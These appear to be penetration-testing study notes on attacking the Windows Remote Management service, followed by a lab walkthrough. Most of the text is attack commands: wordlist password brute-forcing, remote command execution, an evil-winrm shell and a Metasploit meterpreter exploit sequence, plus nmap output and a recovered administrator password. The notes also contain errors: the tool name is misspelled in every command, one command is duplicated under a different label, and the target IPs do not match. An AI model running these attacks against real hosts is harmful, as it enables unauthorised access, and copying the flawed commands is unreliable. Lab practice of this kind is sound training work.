
#### WinRM
	- Protocol to connect to windows system over https
	- TCP port 5985 5986\
	- crackmapexec for brute forcing credentials 
	- Access control for authentication
	- evil-winrm to obtain command shell


#### Tools
crackmacexe - used to attack protocols, mssql, winrm, ssh, smb
evil-winrm.rb - used to obtain remote shell


#### Commands

Brute force credentials
```
crackmacexe winrm target_ip -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

Execute commands on remote server with crackmacexe
```
crackmacexe winrm target_ip -u username -p password -x "whoami"
```

Get system info from remote machine
```
crackmacexe winrm target_ip -u username -p password -x "whoami"
```

Obtain reverse shell with evil-winrm.rb
```
evil-winrm.rb -u username -p password -i target_ip
```

Meterpreter session against winrm
```
service postgresql start
msfconsole
search winrm_script
use exploit/windows/winrm/winrm_script_exec 
options
set RHOSTS target_ip
set USERNAME username
set PASSWORD password
set FORCE_VBS true
exploit
```

A Kali GUI machine and a target machine running a WinRM server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the WinRM service using the tools available on the Kali machine and then exploit the vulnerability using the Metasploit framework exploit and auxiliary modules.

Objective: Exploit the WinRM service to get a meterpreter on the target and retrieve the flag!

- Your Kali machine has an interface with IP address 10.10.X.Y. Run “ip addr” to know the values of X and Y.
- The IP address of the target machine is mentioned in the file “/root/Desktop/target”
- Do not attack the gateway located at IP address 192.V.W.1 and 10.10.X.1
- Dictionaries to use:
- /usr/share/metasploit-framework/data/wordlists/common_users.txt
- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt


```
nmap -p- -sS -sV -T 4 -v 10.4.23.157


135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC

```

```
use auxiliary/scanner/winrm/winrm_login
setg rhosts 10.4.23.196
set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit

[+] 10.4.23.157:5985 - Login Successful: WORKSTATION\administrator:tinkerbell
```